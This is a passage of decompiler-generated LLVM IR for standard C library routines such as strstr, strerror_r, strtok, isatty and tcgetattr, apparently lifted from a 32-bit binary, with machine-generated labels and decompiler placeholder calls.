dec_label_pc_1000a374:                            ; preds = %dec_label_pc_1000a368, %dec_label_pc_1000a33c, %dec_label_pc_1000a348, %dec_label_pc_1000a358, %dec_label_pc_1000a300, %dec_label_pc_1000a2b0
  %v0_1000a380 = phi i32 [ %v0_1000a2b0, %dec_label_pc_1000a2b0 ], [ %v0_1000a304, %dec_label_pc_1000a300 ], [ %v1_1000a358, %dec_label_pc_1000a358 ], [ %v1_1000a348, %dec_label_pc_1000a348 ], [ %v1_1000a328, %dec_label_pc_1000a33c ], [ %v0_1000a378, %dec_label_pc_1000a368 ]
  %v3_1000a374 = icmp ugt i32 %v0_1000a378, %v0_1000a380
  %v0_1000a380.v0_1000a378 = select i1 %v3_1000a374, i32 %v0_1000a380, i32 %v0_1000a378
  %v2_1000a384 = sub i32 %v0_1000a380.v0_1000a378, %tmp
  ret i32 %v2_1000a384

; uselistorder directives
  uselistorder i32 %v1_1000a314, { 1, 0 }
  uselistorder i32 %v0_1000a2b0, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v0_1000a304, { 1, 0, 2 }
  uselistorder i32 %v1_1000a2f4, { 1, 0, 2 }
  uselistorder i32 %v0_1000a2e8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000a378, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000a2b8, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_1000a374, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000a310, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2c8, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000a38c = load i8, i8* %arg2, align 1
  %v4_1000a38c = zext i8 %v3_1000a38c to i32
  store i32 %v4_1000a38c, i32* %r6.global-to-local, align 4
  %v3_1000a390 = icmp eq i8 %v3_1000a38c, 0
  %v0_1000a394 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a390, i32 %v0_1000a394)
  %v1_1000a398 = add i32 %arg1, -1
  store i32 %v1_1000a398, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a39c

dec_label_pc_1000a39c:                            ; preds = %dec_label_pc_1000a3ac, %entry
  %v0_1000a39c = phi i32 [ %v1_1000a39c, %dec_label_pc_1000a3ac ], [ %v1_1000a398, %entry ]
  %v1_1000a39c = add i32 %v0_1000a39c, 1
  %v2_1000a39c = inttoptr i32 %v1_1000a39c to i8*
  %v3_1000a39c = load i8, i8* %v2_1000a39c, align 1
  store i32 %v1_1000a39c, i32* %r3.global-to-local, align 4
  %v3_1000a3a0 = icmp eq i8 %v3_1000a39c, 0
  br i1 %v3_1000a3a0, label %dec_label_pc_1000a478, label %dec_label_pc_1000a3ac

dec_label_pc_1000a3ac:                            ; preds = %dec_label_pc_1000a39c
  %v4_1000a3a4 = icmp eq i8 %v3_1000a39c, %v3_1000a38c
  br i1 %v4_1000a3a4, label %dec_label_pc_1000a3b0, label %dec_label_pc_1000a39c

dec_label_pc_1000a3b0:                            ; preds = %dec_label_pc_1000a3ac
  %v2_1000a3b0 = add i32 %tmp, 1
  %v3_1000a3b0 = inttoptr i32 %v2_1000a3b0 to i8*
  %v4_1000a3b0 = load i8, i8* %v3_1000a3b0, align 1
  %v5_1000a3b0 = zext i8 %v4_1000a3b0 to i32
  store i32 %v5_1000a3b0, i32* %r5.global-to-local, align 4
  store i32 %v2_1000a3b0, i32* %r4.global-to-local, align 4
  %v3_1000a3b8 = icmp eq i8 %v4_1000a3b0, 0
  %v0_1000a3bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a3b8, i32 %v0_1000a3bc)
  %v0_1000a3c0.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a404

dec_label_pc_1000a3cc:                            ; preds = %dec_label_pc_1000a46c
  %v3_1000a3cc = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000a3cc = zext i8 %v3_1000a3cc to i32
  store i32 %v1_1000a3c0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a3f4.preheader

dec_label_pc_1000a3f4.preheader:                  ; preds = %dec_label_pc_1000a3cc, %dec_label_pc_1000a404
  %v0_1000a3f417 = phi i32 [ %v4_1000a3cc, %dec_label_pc_1000a3cc ], [ %storemerge4, %dec_label_pc_1000a404 ]
  %v1_1000a3f4.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000a3f425 = icmp eq i32 %v0_1000a3f417, %v1_1000a3f4.pre
  %v3_1000a3f827 = icmp eq i32 %v0_1000a3f417, 0
  br i1 %v4_1000a3f425, label %dec_label_pc_1000a404, label %dec_label_pc_1000a3d8

dec_label_pc_1000a3d8:                            ; preds = %dec_label_pc_1000a3f4.preheader, %dec_label_pc_1000a3f0
  %v3_1000a3f829 = phi i1 [ %v3_1000a3f8, %dec_label_pc_1000a3f0 ], [ %v3_1000a3f827, %dec_label_pc_1000a3f4.preheader ]
  %v0_1000a3dc28 = phi i32 [ %v1_1000a3f0, %dec_label_pc_1000a3f0 ], [ %v1_1000a3c0, %dec_label_pc_1000a3f4.preheader ]
  br i1 %v3_1000a3f829, label %dec_label_pc_1000a478, label %dec_label_pc_1000a3dc

dec_label_pc_1000a3dc:                            ; preds = %dec_label_pc_1000a3d8
  %v1_1000a3dc = add i32 %v0_1000a3dc28, 1
  %v2_1000a3dc = inttoptr i32 %v1_1000a3dc to i8*
  %v3_1000a3dc = load i8, i8* %v2_1000a3dc, align 1
  %v4_1000a3dc = zext i8 %v3_1000a3dc to i32
  store i32 %v1_1000a3dc, i32* %r11.global-to-local, align 4
  %v4_1000a3e0 = icmp eq i32 %v4_1000a3dc, %v1_1000a3f4.pre
  br i1 %v4_1000a3e0, label %dec_label_pc_1000a404, label %dec_label_pc_1000a3ec

dec_label_pc_1000a3ec:                            ; preds = %dec_label_pc_1000a3dc
  %v3_1000a3e4 = icmp eq i8 %v3_1000a3dc, 0
  br i1 %v3_1000a3e4, label %dec_label_pc_1000a478, label %dec_label_pc_1000a3f0

dec_label_pc_1000a3f0:                            ; preds = %dec_label_pc_1000a3ec
  %v1_1000a3f0 = add i32 %v0_1000a3dc28, 2
  %v2_1000a3f0 = inttoptr i32 %v1_1000a3f0 to i8*
  %v3_1000a3f0 = load i8, i8* %v2_1000a3f0, align 1
  %v4_1000a3f0 = zext i8 %v3_1000a3f0 to i32
  store i32 %v1_1000a3f0, i32* %r11.global-to-local, align 4
  %v4_1000a3f4 = icmp eq i32 %v4_1000a3f0, %v1_1000a3f4.pre
  %v3_1000a3f8 = icmp eq i8 %v3_1000a3f0, 0
  br i1 %v4_1000a3f4, label %dec_label_pc_1000a404, label %dec_label_pc_1000a3d8

dec_label_pc_1000a404:                            ; preds = %dec_label_pc_1000a3f4.preheader, %dec_label_pc_1000a3f0, %dec_label_pc_1000a3dc, %dec_label_pc_1000a3b0
  %v0_1000a3c0.sink = phi i32 [ %v0_1000a3c0.sink.pre, %dec_label_pc_1000a3b0 ], [ %v1_1000a3c0, %dec_label_pc_1000a3f4.preheader ], [ %v1_1000a3f0, %dec_label_pc_1000a3f0 ], [ %v1_1000a3dc, %dec_label_pc_1000a3dc ]
  %v1_1000a3c0 = add i32 %v0_1000a3c0.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000a3c0 to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000a3c0, i32* %r11.global-to-local, align 4
  %v1_1000a404 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000a404 = icmp eq i32 %storemerge4, %v1_1000a404
  br i1 %v4_1000a404, label %dec_label_pc_1000a40c, label %dec_label_pc_1000a3f4.preheader

dec_label_pc_1000a40c:                            ; preds = %dec_label_pc_1000a404
  %v1_1000a40c = add i32 %v0_1000a3c0.sink, 2
  %v2_1000a40c = inttoptr i32 %v1_1000a40c to i8*
  %v3_1000a40c = load i8, i8* %v2_1000a40c, align 1
  %v4_1000a40c = zext i8 %v3_1000a40c to i32
  store i32 %v4_1000a40c, i32* %r10.global-to-local, align 4
  store i32 %v0_1000a3c0.sink, i32* %r3.global-to-local, align 4
  %v0_1000a414 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a414 = add i32 %v0_1000a414, 1
  %v2_1000a414 = inttoptr i32 %v1_1000a414 to i8*
  %v3_1000a414 = load i8, i8* %v2_1000a414, align 1
  %v4_1000a414 = zext i8 %v3_1000a414 to i32
  store i32 %v1_1000a414, i32* %r8.global-to-local, align 4
  store i32 %v1_1000a40c, i32* %r11.global-to-local, align 4
  %v4_1000a420 = icmp eq i8 %v3_1000a40c, %v3_1000a414
  br i1 %v4_1000a420, label %dec_label_pc_1000a428, label %dec_label_pc_1000a46c

dec_label_pc_1000a428:                            ; preds = %dec_label_pc_1000a40c, %dec_label_pc_1000a454.dec_label_pc_1000a428_crit_edge
  %v0_1000a430 = phi i32 [ %v0_1000a430.pre, %dec_label_pc_1000a454.dec_label_pc_1000a428_crit_edge ], [ %v1_1000a414, %dec_label_pc_1000a40c ]
  %v0_1000a42c = phi i32 [ %v0_1000a42c.pre, %dec_label_pc_1000a454.dec_label_pc_1000a428_crit_edge ], [ %v1_1000a40c, %dec_label_pc_1000a40c ]
  %v0_1000a428 = phi i32 [ %v4_1000a458, %dec_label_pc_1000a454.dec_label_pc_1000a428_crit_edge ], [ %v4_1000a40c, %dec_label_pc_1000a40c ]
  %v3_1000a428 = icmp eq i32 %v0_1000a428, 0
  %v1_1000a42c = add i32 %v0_1000a42c, 1
  store i32 %v1_1000a42c, i32* %r7.global-to-local, align 4
  %v1_1000a430 = add i32 %v0_1000a430, 1
  store i32 %v1_1000a430, i32* %r10.global-to-local, align 4
  %v0_1000a434 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a428, i32 %v0_1000a434)
  %v0_1000a438 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a438 = add i32 %v0_1000a438, 1
  %v2_1000a438 = inttoptr i32 %v1_1000a438 to i8*
  %v3_1000a438 = load i8, i8* %v2_1000a438, align 1
  %v4_1000a438 = zext i8 %v3_1000a438 to i32
  %v0_1000a43c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a43c = add i32 %v0_1000a43c, 1
  store i32 %v1_1000a43c, i32* %r8.global-to-local, align 4
  %v0_1000a440 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a440 = add i32 %v0_1000a440, 1
  %v2_1000a440 = inttoptr i32 %v1_1000a440 to i8*
  %v3_1000a440 = load i8, i8* %v2_1000a440, align 1
  %v0_1000a444 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a444 = add i32 %v0_1000a444, 1
  store i32 %v1_1000a444, i32* %r11.global-to-local, align 4
  %v4_1000a44c = icmp eq i8 %v3_1000a440, %v3_1000a438
  br i1 %v4_1000a44c, label %dec_label_pc_1000a454, label %dec_label_pc_1000a46c

dec_label_pc_1000a454:                            ; preds = %dec_label_pc_1000a428
  %v3_1000a448 = icmp eq i8 %v3_1000a438, 0
  %v0_1000a454 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a448, i32 %v0_1000a454)
  %v0_1000a458 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a458 = add i32 %v0_1000a458, 1
  %v2_1000a458 = inttoptr i32 %v1_1000a458 to i8*
  %v3_1000a458 = load i8, i8* %v2_1000a458, align 1
  %v4_1000a458 = zext i8 %v3_1000a458 to i32
  %v0_1000a45c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a45c = add i32 %v0_1000a45c, 1
  %v2_1000a45c = inttoptr i32 %v1_1000a45c to i8*
  %v3_1000a45c = load i8, i8* %v2_1000a45c, align 1
  store i32 %v4_1000a458, i32* %r10.global-to-local, align 4
  %v4_1000a464 = icmp eq i8 %v3_1000a45c, %v3_1000a458
  br i1 %v4_1000a464, label %dec_label_pc_1000a454.dec_label_pc_1000a428_crit_edge, label %dec_label_pc_1000a46c

dec_label_pc_1000a454.dec_label_pc_1000a428_crit_edge: ; preds = %dec_label_pc_1000a454
  %v0_1000a42c.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000a430.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a428

dec_label_pc_1000a46c:                            ; preds = %dec_label_pc_1000a454, %dec_label_pc_1000a428, %dec_label_pc_1000a40c
  %v0_1000a46c = phi i32 [ %v4_1000a414, %dec_label_pc_1000a40c ], [ %v4_1000a458, %dec_label_pc_1000a454 ], [ %v4_1000a438, %dec_label_pc_1000a428 ]
  %v3_1000a46c = icmp eq i32 %v0_1000a46c, 0
  br i1 %v3_1000a46c, label %dec_label_pc_1000a474, label %dec_label_pc_1000a3cc

dec_label_pc_1000a474:                            ; preds = %dec_label_pc_1000a46c
  ret i32 %v0_1000a3c0.sink

dec_label_pc_1000a478:                            ; preds = %dec_label_pc_1000a39c, %dec_label_pc_1000a3ec, %dec_label_pc_1000a3d8
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000a458, { 0, 2, 1 }
  uselistorder i8 %v3_1000a438, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000a3c0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000a3c0.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000a3f0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000a3dc28, { 1, 0 }
  uselistorder i32 %v1_1000a3f4.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000a39c, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000a478, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a428, { 1, 0 }
  uselistorder label %dec_label_pc_1000a404, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000a3d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3f4.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268477592, i32* @lr, align 4
  %v0_1000a494 = call i32 @__xpg_strerror_r()
  %v0_1000a49c = load i32, i32* @r29, align 4
  ret i32 %v0_1000a49c
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000a4b0 = load i32, i32* @r3, align 4
  %v2_1000a4b0 = icmp ugt i32 %v0_1000a4b0, 124
  %v0_1000a4c0 = load i32, i32* @r4, align 4
  store i32 %v0_1000a4c0, i32* %r27.global-to-local, align 4
  %v0_1000a4c8 = load i32, i32* @r5, align 4
  br i1 %v2_1000a4b0, label %dec_label_pc_1000a50c, label %dec_label_pc_1000a4d0

dec_label_pc_1000a4d0:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1000eb68.197 to i32), i32* %r30.global-to-local, align 4
  %v3_1000a4ec7 = icmp eq i32 %v0_1000a4b0, 0
  br i1 %v3_1000a4ec7, label %dec_label_pc_1000a500, label %dec_label_pc_1000a4e0

dec_label_pc_1000a4e0:                            ; preds = %dec_label_pc_1000a4d0, %dec_label_pc_1000a4e0
  %v0_1000a4e4 = phi i32 [ %v1_1000a4e4, %dec_label_pc_1000a4e0 ], [ ptrtoint ([8 x i8]* @global_var_1000eb68.197 to i32), %dec_label_pc_1000a4d0 ]
  %v1_1000a4e4 = add i32 %v0_1000a4e4, 1
  store i32 %v1_1000a4e4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a4e0

dec_label_pc_1000a500:                            ; preds = %dec_label_pc_1000a4d0
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a540

dec_label_pc_1000a50c:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000a4b0, 0
  %v1_1000a510 = zext i1 %tmp to i32
  %v2_1000a510 = ashr i32 %v0_1000a4b0, 31
  %v3_1000a510 = and i32 %v2_1000a510, -2
  %v4_1000a510 = or i32 %v3_1000a510, %v1_1000a510
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000a524 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000a524 = call i32 @_uintmaxtostr(i8* %v5_1000a524, i32 %v4_1000a510, i32 %v0_1000a4b0, i32 -10, i32 0)
  %v1_1000a52c = add i32 %v6_1000a524, -14
  store i32 %v1_1000a52c, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1000eb58.198 to i32), i32* @r4, align 4
  store i32 %v1_1000a52c, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268477760, i32* @lr, align 4
  %v0_1000a53c = call i32 @memcpy()
  %v0_1000a540.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000a544.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000a554.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000a540

dec_label_pc_1000a540:                            ; preds = %dec_label_pc_1000a500, %dec_label_pc_1000a50c
  %v0_1000a554 = phi i32 [ %v0_1000a4c8, %dec_label_pc_1000a500 ], [ %v0_1000a554.pre, %dec_label_pc_1000a50c ]
  %v0_1000a544 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1000eb68.197 to i32), %dec_label_pc_1000a500 ], [ %v0_1000a544.pre, %dec_label_pc_1000a50c ]
  %v1_1000a548 = phi i32 [ %v0_1000a4c0, %dec_label_pc_1000a500 ], [ %v0_1000a540.pre, %dec_label_pc_1000a50c ]
  %tmp19 = icmp slt i32 %v1_1000a548, 0
  %v1_1000a540 = zext i1 %tmp19 to i32
  %v2_1000a540 = ashr i32 %v1_1000a548, 31
  %v3_1000a540 = and i32 %v2_1000a540, -2
  %v4_1000a540 = or i32 %v3_1000a540, %v1_1000a540
  store i32 %v0_1000a544, i32* @r3, align 4
  %v2_1000a548 = xor i32 %v4_1000a540, %v1_1000a548
  %v2_1000a54c = sub i32 %v4_1000a540, %v2_1000a548
  %tmp20 = icmp slt i32 %v2_1000a54c, 0
  %v1_1000a550 = zext i1 %tmp20 to i32
  %v2_1000a550 = ashr i32 %v2_1000a54c, 31
  %v3_1000a550 = and i32 %v2_1000a550, -2
  %v4_1000a550 = or i32 %v3_1000a550, %v1_1000a550
  %v2_1000a554 = and i32 %v4_1000a550, %v0_1000a554
  store i32 %v2_1000a554, i32* @r29, align 4
  %v0_1000a558 = call i32 @__GI_strlen()
  %v1_1000a55c = add i32 %v0_1000a558, 1
  store i32 %v1_1000a55c, i32* %r31.global-to-local, align 4
  %v1_1000a560 = load i32, i32* @r29, align 4
  %v3_1000a560 = icmp ugt i32 %v1_1000a55c, %v1_1000a560
  br i1 %v3_1000a560, label %dec_label_pc_1000a568, label %dec_label_pc_1000a570

dec_label_pc_1000a568:                            ; preds = %dec_label_pc_1000a540
  store i32 %v1_1000a560, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a570

dec_label_pc_1000a570:                            ; preds = %dec_label_pc_1000a540, %dec_label_pc_1000a568
  %v0_1000a580 = phi i32 [ %v1_1000a560, %dec_label_pc_1000a568 ], [ %v1_1000a55c, %dec_label_pc_1000a540 ]
  %v3_1000a570 = icmp eq i32 %v0_1000a580, 0
  br i1 %v3_1000a570, label %dec_label_pc_1000a594, label %dec_label_pc_1000a578

dec_label_pc_1000a578:                            ; preds = %dec_label_pc_1000a570
  %v0_1000a578 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000a578, i32* @r4, align 4
  %v0_1000a57c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000a57c, i32* @r3, align 4
  store i32 %v0_1000a580, i32* @r5, align 4
  store i32 268477832, i32* @lr, align 4
  %v0_1000a584 = call i32 @memcpy()
  %v1_1000a588 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a588 = add i32 %v1_1000a588, %v0_1000a57c
  %v3_1000a590 = add i32 %v2_1000a588, -1
  %v4_1000a590 = inttoptr i32 %v3_1000a590 to i8*
  store i8 0, i8* %v4_1000a590, align 1
  br label %dec_label_pc_1000a594

dec_label_pc_1000a594:                            ; preds = %dec_label_pc_1000a570, %dec_label_pc_1000a578
  %v0_1000a594 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000a594 = icmp eq i32 %v0_1000a594, 0
  br i1 %v3_1000a594, label %dec_label_pc_1000a5a4, label %dec_label_pc_1000a59c

dec_label_pc_1000a59c:                            ; preds = %dec_label_pc_1000a594
  %v0_1000a59c = call i32 @__errno_location()
  %v0_1000a5a0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000a5a0 = inttoptr i32 %v0_1000a59c to i32*
  store i32 %v0_1000a5a0, i32* %v2_1000a5a0, align 4
  %v0_1000a5a8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a5a4

dec_label_pc_1000a5a4:                            ; preds = %dec_label_pc_1000a594, %dec_label_pc_1000a59c
  %v0_1000a5a8 = phi i32 [ 0, %dec_label_pc_1000a594 ], [ %v0_1000a5a8.pre, %dec_label_pc_1000a59c ]
  ret i32 %v0_1000a5a8

; uselistorder directives
  uselistorder i32 %v2_1000a54c, { 1, 0 }
  uselistorder i32 %v4_1000a540, { 1, 0 }
  uselistorder i32 %v1_1000a548, { 1, 2, 0 }
  uselistorder i32 %v1_1000a4e4, { 1, 0 }
  uselistorder i32 %v0_1000a4b0, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 ()* @__GI_strlen, { 20, 19, 18, 11, 17, 16, 15, 13, 14, 12, 5, 4, 10, 0, 9, 8, 6, 7, 3, 2, 1 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1000eb68.197 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a5a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a594, { 1, 0 }
  uselistorder label %dec_label_pc_1000a570, { 1, 0 }
  uselistorder label %dec_label_pc_1000a540, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4e0, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1001fdcc.199 to i32), i32* @r5, align 4
  %v1_1000a5c4 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1001fdcc.199 to i32))
  ret i32 %v1_1000a5c4
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268477916, i32* @lr, align 4
  %v2_1000a5d8 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a5f8 = load i32, i32* @lr, align 4
  store i32 %v0_1000a5f8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a608 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268477980, i32* @lr, align 4
  %v3_1000a618 = call i32 @ioctl(i32 1076655123, i32 %v2_1000a608, i32 %v2_1000a608)
  %v2_1000a61c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000a61c, i32* @r4, align 4
  store i32 %v3_1000a618, i32* @r30, align 4
  %v3_1000a620 = icmp eq i32 %v3_1000a618, 0
  store i32 19, i32* @r5, align 4
  %v0_1000a628 = load i32, i32* @r31, align 4
  br i1 %v3_1000a620, label %dec_label_pc_1000a630, label %dec_label_pc_1000a678

dec_label_pc_1000a630:                            ; preds = %entry
  %v1_1000a628 = add i32 %v0_1000a628, 17
  %v3_1000a648 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000a648, i32* %r0.global-to-local, align 4
  %v2_1000a64c = add i32 %v0_1000a628, 4
  %v3_1000a64c = inttoptr i32 %v2_1000a64c to i32*
  store i32 %tmp7, i32* %v3_1000a64c, align 4
  %v0_1000a650 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a650 = load i32, i32* @r31, align 4
  %v2_1000a650 = inttoptr i32 %v1_1000a650 to i32*
  store i32 %v0_1000a650, i32* %v2_1000a650, align 4
  %v0_1000a654 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a654 = load i32, i32* @r31, align 4
  %v2_1000a654 = add i32 %v1_1000a654, 8
  %v3_1000a654 = inttoptr i32 %v2_1000a654 to i32*
  store i32 %v0_1000a654, i32* %v3_1000a654, align 4
  %v0_1000a658 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a658 = load i32, i32* @r31, align 4
  %v2_1000a658 = add i32 %v1_1000a658, 12
  %v3_1000a658 = inttoptr i32 %v2_1000a658 to i32*
  store i32 %v0_1000a658, i32* %v3_1000a658, align 4
  %v3_1000a65c = load i32, i32* @r31, align 4
  %v4_1000a65c = add i32 %v3_1000a65c, 16
  %v5_1000a65c = inttoptr i32 %v4_1000a65c to i8*
  store i8 %tmp4, i8* %v5_1000a65c, align 1
  %v1_1000a660 = load i32, i32* @r31, align 4
  %v2_1000a660 = add i32 %v1_1000a660, 52
  %v3_1000a660 = inttoptr i32 %v2_1000a660 to i32*
  store i32 %tmp3, i32* %v3_1000a660, align 4
  %v1_1000a664 = load i32, i32* @r31, align 4
  %v2_1000a664 = add i32 %v1_1000a664, 56
  %v3_1000a664 = inttoptr i32 %v2_1000a664 to i32*
  store i32 %tmp2, i32* %v3_1000a664, align 4
  store i32 268478060, i32* @lr, align 4
  %v6_1000a668 = sext i8 %tmp4 to i32
  %v8_1000a668 = call i32 @__GI_mempcpy(i32 %v1_1000a628, i32 %v2_1000a61c, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000a668, i32 %tmp7)
  store i32 268478072, i32* @lr, align 4
  %v3_1000a674 = call i32 @__GI_memset(i32 %v8_1000a668, i32 0, i32 13)
  %v0_1000a67c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a678

dec_label_pc_1000a678:                            ; preds = %entry, %dec_label_pc_1000a630
  %v0_1000a67c = phi i32 [ %v3_1000a618, %entry ], [ %v0_1000a67c.pre, %dec_label_pc_1000a630 ]
  store i32 %v0_1000a5f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a67c

; uselistorder directives
  uselistorder i32 %v2_1000a608, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000a678, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a690 = load i32, i32* @r4, align 4
  %v3_1000a690 = icmp eq i32 %v0_1000a690, 1
  %v0_1000a6a0 = load i32, i32* @r3, align 4
  store i32 %v0_1000a6a0, i32* @r27, align 4
  %v0_1000a6a8 = load i32, i32* @r5, align 4
  store i32 %v0_1000a6a8, i32* @r31, align 4
  br i1 %v3_1000a690, label %dec_label_pc_1000a6cc, label %dec_label_pc_1000a6b0

dec_label_pc_1000a6b0:                            ; preds = %entry
  %v3_1000a6b0 = icmp eq i32 %v0_1000a690, 2
  br i1 %v3_1000a6b0, label %dec_label_pc_1000a6ec, label %dec_label_pc_1000a6b8

dec_label_pc_1000a6b8:                            ; preds = %dec_label_pc_1000a6b0
  %v3_1000a6b8 = icmp eq i32 %v0_1000a690, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000a6b8, label %dec_label_pc_1000a6f4, label %dec_label_pc_1000a6d8

dec_label_pc_1000a6cc:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000a6f4

dec_label_pc_1000a6d8:                            ; preds = %dec_label_pc_1000a6b8
